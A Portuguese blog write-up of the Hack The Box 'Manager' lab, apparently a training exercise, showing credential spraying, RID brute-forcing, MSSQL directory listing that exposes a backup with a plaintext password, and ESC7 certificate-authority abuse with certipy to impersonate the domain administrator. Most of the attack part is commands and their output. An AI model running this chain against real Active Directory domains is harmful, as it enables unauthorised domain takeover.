---
description: CTF do Hack The Box como fiz e anotações.
title: HackTheBox - Manager - Médio
date: 2024-02-06 23:49:00 +/-0300
categories: [CTF, HackTheBox]
tags: [ctf, hackthebox, windows, certipy, ADCS, medio, ]     # TAG names should always be lowercase
show_image_post: true
---
![logo](/assets/img/manager.png){: w="100" h="100" .left}

---
# **CTF - Manager**
---
---
## **Enumeração**

### nmap

```shell
╭─      ~/HTB/manager               
╰─ sudo nmap -sV -Pn -sS --min-rate 10000 --stats-every=7s 10.10.11.236 -p- -oN nmap 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-01 23:01 -03
Nmap scan report for 10.10.11.236
Host is up (0.18s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-02 09:02:00Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49749/tcp open  msrpc         Microsoft Windows RPC
50647/tcp open  msrpc         Microsoft Windows RPC
50735/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.89 seconds
```
{: .nolineno }
Buscas por diretórios e subdomínios com FFUF, nada encontrado.

Porta 80 apenas um site básico.

![alt text](/assets/img/manager1.png)

### crackmapexec

```shell
╭─      ~/HTB/manager               1 ✘  11s   
╰─ crackmapexec smb manager.htb
SMB         manager.htb     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
╭─      ~/HTB/manager               ✔  4s   
╰─ crackmapexec winrm manager.htb
SMB         manager.htb     5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)
HTTP        manager.htb     5985   DC01             [*] http://manager.htb:5985/wsman
```
{: .nolineno }
Domínios adicionado ao /etc/hosts

`dc01.manager.htb`  
`manager.htb`  
`dc01`  

Obtendo usuários através do crackmapexec smb
### crackmapexec brute force em RIDS

```shell
╭─      ~/HTB/manager             ✔  21s      
╰─ crackmapexec smb manager.htb -u anonymous -p '' --rid-brute 10000
SMB         manager.htb     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         manager.htb     445    DC01             [+] manager.htb\anonymous: 
SMB         manager.htb     445    DC01             [+] Brute forcing RIDs
SMB         manager.htb     445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         manager.htb     445    DC01             500: MANAGER\Administrator (SidTypeUser)
SMB         manager.htb     445    DC01             501: MANAGER\Guest (SidTypeUser)
SMB         manager.htb     445    DC01             502: MANAGER\krbtgt (SidTypeUser)
SMB         manager.htb     445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
SMB         manager.htb     445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
SMB         manager.htb     445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
SMB         manager.htb     445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
SMB         manager.htb     445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
SMB         manager.htb     445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
SMB         manager.htb     445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
SMB         manager.htb     445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
SMB         manager.htb     445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
SMB         manager.htb     445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
SMB         manager.htb     445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
SMB         manager.htb     445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
SMB         manager.htb     445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
SMB         manager.htb     445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
SMB         manager.htb     445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
SMB         manager.htb     445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         manager.htb     445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
SMB         manager.htb     445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
SMB         manager.htb     445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
SMB         manager.htb     445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
SMB         manager.htb     445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB         manager.htb     445    DC01             1113: MANAGER\Zhong (SidTypeUser)
SMB         manager.htb     445    DC01             1114: MANAGER\Cheng (SidTypeUser)
SMB         manager.htb     445    DC01             1115: MANAGER\Ryan (SidTypeUser)
SMB         manager.htb     445    DC01             1116: MANAGER\Raven (SidTypeUser)
SMB         manager.htb     445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
SMB         manager.htb     445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
SMB         manager.htb     445    DC01             1119: MANAGER\Operator (SidTypeUser)
```
{: .nolineno }

Criei uma user list com os usuários listados.

Zhong
Cheng
Ryan
Raven
JinWoo
ChinHae
Operator
Administrator
zhong
cheng
ryan
raven
jinWoo
chinHae
operator
administrator

Checando se é possível obter alguma hash com ataque `ASREPRoasting`.

### impacket-GetNPUsers

```shell
╰─ impacket-GetNPUsers -no-pass -dc-ip 10.10.11.236 manager.htb/ -format john -usersfile users.txt
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User Zhong doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Cheng doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Ryan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Raven doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User ChinHae doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Operator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```
{: .nolineno }
Bruteforce com a wordlist de usuários com users list user:password

```shell
╭─      ~/HTB/manager                           INT ✘ 
╰─ crackmapexec smb manager.htb -u users.txt -p users.txt
SMB         manager.htb     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         manager.htb     445    DC01             [-] manager.htb\zhong:zhong STATUS_LOGON_FAILURE 
SMB         manager.htb     445    DC01             [-] manager.htb\zhong:cheng STATUS_LOGON_FAILURE 
SMB         manager.htb     445    DC01             [-] manager.htb\zhong:ryan STATUS_LOGON_FAILURE 
<snip>
SMB         manager.htb     445    DC01             [-] manager.htb\operator:cheng STATUS_LOGON_FAILURE 
SMB         manager.htb     445    DC01             [-] manager.htb\operator:ryan STATUS_LOGON_FAILURE 
SMB         manager.htb     445    DC01             [-] manager.htb\operator:raven STATUS_LOGON_FAILURE 
SMB         manager.htb     445    DC01             [-] manager.htb\operator:jinWoo STATUS_LOGON_FAILURE 
SMB         manager.htb     445    DC01             [-] manager.htb\operator:chinHae STATUS_LOGON_FAILURE 
SMB         manager.htb     445    DC01             [+] manager.htb\operator:operator 
```
{: .nolineno }
![alt text](/assets/img/manager2.png)

Enumerando compartilhamentos e usuários com credencial operator

```shell
╭─      ~/HTB/manager          
╰─ crackmapexec smb manager.htb -u operator -p operator --shares --users
SMB         manager.htb     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         manager.htb     445    DC01             [+] manager.htb\operator:operator 
SMB         manager.htb     445    DC01             [+] Enumerated shares
SMB         manager.htb     445    DC01             Share           Permissions     Remark
SMB         manager.htb     445    DC01             -----           -----------     ------
SMB         manager.htb     445    DC01             ADMIN$                          Remote Admin
SMB         manager.htb     445    DC01             C$                              Default share
SMB         manager.htb     445    DC01             IPC$            READ            Remote IPC
SMB         manager.htb     445    DC01             NETLOGON        READ            Logon server share 
SMB         manager.htb     445    DC01             SYSVOL          READ            Logon server share 
SMB         manager.htb     445    DC01             [+] Enumerated domain user(s)
SMB         manager.htb     445    DC01             manager.htb\Operator                       badpwdcount: 0 desc: 
SMB         manager.htb     445    DC01             manager.htb\ChinHae                        badpwdcount: 26 desc: 
SMB         manager.htb     445    DC01             manager.htb\JinWoo                         badpwdcount: 26 desc: 
SMB         manager.htb     445    DC01             manager.htb\Raven                          badpwdcount: 26 desc: 
SMB         manager.htb     445    DC01             manager.htb\Ryan                           badpwdcount: 33 desc: 
SMB         manager.htb     445    DC01             manager.htb\Cheng                          badpwdcount: 41 desc: 
SMB         manager.htb     445    DC01             manager.htb\Zhong                          badpwdcount: 41 desc: 
SMB         manager.htb     445    DC01             manager.htb\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
SMB         manager.htb     445    DC01             manager.htb\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
SMB         manager.htb     445    DC01             manager.htb\Administrator                  badpwdcount: 18 desc: Built-in 
```
{: .nolineno }

Acessado IPC$, NETLOGON e SYSVOL via smbclient, sem arquivos.

Mapeado com script spider_plus e nada encontrado.

```shell
╭─      ~/HTB/manager      
╰─ crackmapexec smb manager.htb -u operator -p operator -M spider_plus
```
{: .nolineno }

## **Exploração**

### impacket-mssqlclient
Conectando no mssql via impacket

```shell
╭─      ~/HTB/manager          
╰─ impacket-mssqlclient operator:operator@manager.htb -windows-auth 
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (MANAGER\Operator  guest@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonate
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    show_query                 - show query
    mask_query                 - mask query
```
{: .nolineno }
`xp_cmdshell {cmd}`  está desabilitado, mas `xp_dirtree {path}` habilitado

Depois de explorar alguns diretórios com o xp_dirtree, foi encontrado esse .zip na raiz do site
![alt text](/assets/img/manager3.png)

Arquivo baixado e extraído, buscando por passwords nos arquivos, `grep -rnwi 'password'`.  

![alt text](/assets/img/manager5.png)

```shell
╭─      ~/HTB/manager/website-backup-27-07-23-old     ╰─ cat .old-conf.xml                        
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>
```
{: .nolineno }
Usando as credenciais acima enumerei novamente o smb, nada encontrado

Keberoasting sem sucesso

```shell
╭─      ~/HTB/manager/website-backup-27-07-23-old               ✔  3s   
╰─ impacket-GetUserSPNs manager.htb/raven -dc-ip manager.htb -request 
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
No entries found!
```
{: .nolineno }
Logando via evil-wrm
![alt text](/assets/img/manager6.png)

### Pimeira Flag

![alt text](/assets/img/manager7.png)
## **Escalação de Privilégio**
Rodei o winpeas chequei algumas possíveis vulnerabilidade, sem sucesso =/

> **Escalação de privilégios:
Obter o administrador de domínio através do ADCS.
Como esta é uma máquina do Active Directory, há uma chance de o domínio conter um serviço de certificado do Active Directory (ADCS), que funciona como uma infraestrutura de chave pública. O ADCS pode conter vulnerabilidades graves que podem ser exploradas para obter, por exemplo, certificados e hashes de outros usuários e, portanto, permitir o escalonamento de privilégios.**
{: .prompt-tip }
Pra ver se um CA é usado, executei o comando certutil. Ai está o CA.
![alt text](/assets/img/manager8.png)

### certipy

Usando o certipy pra procurar vulnerabilidades de certificados.

Links da ferramenta e sobre o CA vulnerável:  
<https://github.com/ly4k/Certipy?tab=readme-ov-file#esc7>  
<https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#abuse>

Erros com certipy resolva por aqui:  
<https://medium.com/@init.d/certipy-or-certipy-ad-40a313992692> ou siga os passos abaixo.

> **Extremamente recomendado remover a versão que vem no kali e já instalar essa mais atual do github, para evitar erros durante o procedimento, seguindo esses passos.**  
`sudo apt purge certipy-ad`  
`sudo apt autoremove certipy-ad`  
`git clone https://github.com/ly4k/Certipy.git`  
`cd certipy`  
`python3 setup.py install --user`
{: .prompt-info }

#### buscando por vulnerabilidades com certipy
```shell
╭─  ~/HTB/manager ✔ 
╰─ certipy find -vulnerable -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -debug -dc-ip 10.10.11.236        
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Authenticating to LDAP server
[+] Bound to ldaps://10.10.11.236:636 - ssl
[+] Default path: DC=manager,DC=htb
[+] Configuration path: CN=Configuration,DC=manager,DC=htb
[+] Adding Domain Computers to list of current user's SIDs
[+] List of current user's SIDs:
     MANAGER.HTB\Raven (S-1-5-21-4078382237-1492182817-2568127209-1116)
     MANAGER.HTB\Domain Computers (S-1-5-21-4078382237-1492182817-2568127209-515)
     MANAGER.HTB\Domain Users (S-1-5-21-4078382237-1492182817-2568127209-513)
     MANAGER.HTB\Users (MANAGER.HTB-S-1-5-32-545)
     MANAGER.HTB\Authenticated Users (MANAGER.HTB-S-1-5-11)
     MANAGER.HTB\Access Control Assistance Operators (MANAGER.HTB-S-1-5-32-580)
     MANAGER.HTB\Everyone (MANAGER.HTB-S-1-1-0)
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[+] Trying to resolve 'dc01.manager.htb' at '10.10.11.236'
[*] Trying to get CA configuration for 'manager-DC01-CA' via CSRA
[+] Trying to get DCOM connection for: 10.10.11.236
[*] Got CA configuration for 'manager-DC01-CA'
[+] Resolved 'dc01.manager.htb' from cache: 10.10.11.236                                                                                                                     
[+] Connecting to 10.10.11.236:80                                                                                                                                            
[*] Saved BloodHound data to '20240204020649_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k                                                         
[*] Saved text output to '20240204020649_Certipy.txt'                                                                                                                        
[*] Saved JSON output to '20240204020649_Certipy.json'                             

╭─      ~/HTB/manager                       ✔  8s   
╰─ cat 20240204020449_Certipy.txt                                                                      
Certificate Authorities
  0
    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.manager.htb
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : MANAGER.HTB\Administrators
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
    [!] Vulnerabilities
      ESC7                              : 'MANAGER.HTB\\Raven' has dangerous permissions
Certificate Templates                   : [!] Could not find any certificate templates
```
{: .nolineno }
![alt text](/assets/img/manager9.png)
### Escalando para administrator
#### Exploitando a vulnerabilidade com certipy

```shell
╭─      ~     ✔  13s   
╰─ certipy ca -ca 'manager-DC01-CA' -add-officer raven -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236    
Certipy v4.8.2 - by Oliver Lyak (ly4k)
[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
```
{: .nolineno }

```shell
╭─      ~       ✔  5s   
╰─ certipy ca -ca 'manager-DC01-CA' -enable-template SubCA -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
```
{: .nolineno }

```shell
 ─      ~           2 ✘  5s   
╰─ certipy req -ca 'manager-DC01-CA' -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -target dc01.manager.htb -template SubCA -upn administrator@manager.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 13
Would you like to save the private key? (y/N) y
[*] Saved private key to 13.key
[-] Failed to request certificate
```
{: .nolineno }
Caso estiver tendo erro igual na imagem abaixo, use o comando sudo `ntpdate -u dc01.manager.htb`  , para syncronizar o relógio com o kerberus da box.
![alt text](/assets/img/manager11.png)
```shell
╭─      ~         ✔  5s   
╰─ sudo ntpdate -u dc01.manager.tb                                                                                            
2024-02-04 09:50:34.489715 (-0300) +17.098832 +/- 0.062658 dc01.manager.htb 10.10.11.236 s1 no-leap
CLOCK: time stepped by 17.098832
```
{: .nolineno }
```shell
╭─      ~                       ✔  17s   
╰─ certipy ca -ca 'manager-DC01-CA' -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -issue-request 19
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
{: .nolineno }
Obtendo a hash do admin com o certipy
![alt text](/assets/img/manager10.png)

### Segunda Flag

Agora basta logar via evil-winrm e obter a flag.
![alt text](/assets/img/manager12.png)

Ajuste o horário com o comando:  
`sudo ntpdate -u a.ntp.br`

**Conhecimentos adquiridos:**
- Vulnerabilidade de certificados 
- Uso do certipy  

 ![alt text](/assets/img/manager13.png)